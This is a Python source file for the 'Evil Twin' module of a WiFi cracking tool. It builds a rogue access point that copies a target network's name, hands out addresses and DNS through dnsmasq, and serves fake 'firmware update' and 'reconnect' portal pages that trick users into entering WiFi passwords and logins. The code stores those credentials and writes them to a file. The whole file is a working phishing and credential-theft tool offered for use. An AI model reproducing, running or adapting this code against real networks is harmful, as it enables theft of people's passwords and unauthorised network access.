#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RS WiFi Cracker PRO v4.0 - Evil Twin Module"""

import os
import sys
import time
import json
import subprocess
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Dict, List, Optional
from dataclasses import dataclass, field
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.logger import Logger

logger = Logger('EvilTwin')


@dataclass
class CaptiveCredential:
    username: str
    password: str
    email: str = ""
    mac: str = ""
    timestamp: str = ""
    ip: str = ""


class EvilTwin:
    """Evil Twin Attack Suite - Rogue AP with Captive Portal"""
    
    PORTALS = {
        'router_update': '''<!DOCTYPE html>
<html><head><title>Router Update</title>
<style>body{font-family:Arial;background:#f0f0f0;text-align:center;padding:50px;}
.container{background:white;padding:40px;border-radius:10px;max-width:400px;margin:0 auto;box-shadow:0 2px 10px rgba(0,0,0,0.1);}
h1{color:#d32f2f;}input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box;}
button{width:100%;padding:12px;background:#1976d2;color:white;border:none;border-radius:5px;cursor:pointer;font-size:16px;}</style>
</head><body><div class="container">
<h1>⚠️ Firmware Update Required</h1>
<p>Your router requires a critical security update.</p>
<form method="POST" action="/submit">
<input type="password" name="password" placeholder="WiFi Password" required>
<button type="submit">Update Now</button>
</form></div></body></html>''',
        
        'wifi_reconnect': '''<!DOCTYPE html>
<html><head><title>WiFi Reconnect</title>
<style>body{font-family:Arial;background:#e8f5e9;text-align:center;padding:50px;}
.container{background:white;padding:40px;border-radius:10px;max-width:400px;margin:0 auto;}
input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box;}
button{width:100%;padding:12px;background:#4caf50;color:white;border:none;border-radius:5px;cursor:pointer;}</style>
</head><body><div class="container">
<h1>📶 Reconnect to WiFi</h1>
<p>Your session has expired. Please reconnect.</p>
<form method="POST" action="/submit">
<input type="text" name="username" placeholder="Username">
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form></div></body></html>''',
    }
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.ssid = ""
        self.credentials: List[CaptiveCredential] = []
        self.credential_queue = []
        self.http_server = None
        self.hostapd_process = None
        self.processes = []
    
    def start(self, target, attack_type: str = "portal") -> bool:
        """Start Evil Twin attack"""
        self.ssid = target.essid if hasattr(target, 'essid') else str(target)
        self.running = True
        
        # Stop NetworkManager
        subprocess.run(['sudo', 'systemctl', 'stop', 'NetworkManager'], capture_output=True)
        
        # Configure interface
        subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', self.interface], capture_output=True)
        subprocess.run(['sudo', 'ip', 'addr', 'add', '10.0.0.1/24', 'dev', self.interface], capture_output=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'], capture_output=True)
        
        if attack_type == "portal":
            return self._start_captive_portal()
        return self._start_open_ap()
    
    def _start_open_ap(self) -> bool:
        """Start open AP"""
        config = f"""interface={self.interface}
driver=nl80211
ssid={self.ssid}
channel=6
hw_mode=g
"""
        config_file = '/tmp/hostapd.conf'
        with open(config_file, 'w') as f:
            f.write(config)
        
        try:
            self.hostapd_process = subprocess.Popen(
                ['sudo', 'hostapd', config_file],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            return True
        except:
            return False
    
    def _start_captive_portal(self) -> bool:
        """Start captive portal"""
        if not self._start_open_ap():
            return False
        
        # Start DHCP
        self._start_dhcp()
        
        # Start HTTP server
        self._start_http_server()
        
        return True
    
    def _start_dhcp(self):
        """Start DHCP server"""
        config = f"""interface={self.interface}
dhcp-range=10.0.0.2,10.0.0.100
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
"""
        config_file = '/tmp/dnsmasq.conf'
        with open(config_file, 'w') as f:
            f.write(config)
        
        try:
            process = subprocess.Popen(
                ['sudo', 'dnsmasq', '-C', config_file, '-d'],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self.processes.append(process)
        except:
            pass
    
    def _start_http_server(self):
        """Start HTTP server for captive portal"""
        portal_html = self.PORTALS['router_update']
        credentials = self.credentials
        
        class PortalHandler(BaseHTTPRequestHandler):
            def log_message(self, *args): pass
            
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(portal_html.encode())
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode()
                
                data = {}
                for pair in body.split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        data[key] = value.replace('+', ' ')
                
                cred = CaptiveCredential(
                    username=data.get('username', ''),
                    password=data.get('password', ''),
                    email=data.get('email', ''),
                    ip=self.client_address[0]
                )
                credentials.append(cred)
                
                self.send_response(302)
                self.send_header('Location', '/success')
                self.end_headers()
        
        def run_server():
            server = HTTPServer(('0.0.0.0', 80), PortalHandler)
            self.http_server = server
            server.serve_forever()
        
        thread = threading.Thread(target=run_server, daemon=True)
        thread.start()
    
    def get_credentials(self) -> Optional[CaptiveCredential]:
        """Get captured credential"""
        if self.credentials:
            return self.credentials[-1]
        return None
    
    def get_all_credentials(self) -> List[CaptiveCredential]:
        return self.credentials.copy()
    
    def stop(self):
        """Stop Evil Twin"""
        self.running = False
        
        if self.http_server:
            self.http_server.shutdown()
        
        for p in self.processes:
            p.terminate()
        
        if self.hostapd_process:
            self.hostapd_process.terminate()
        
        subprocess.run('sudo iptables -F', shell=True, capture_output=True)
        subprocess.run(['sudo', 'systemctl', 'start', 'NetworkManager'], capture_output=True)
    
    def save_credentials(self, output_file: str):
        with open(output_file, 'w') as f:
            json.dump([c.__dict__ for c in self.credentials], f, indent=2)
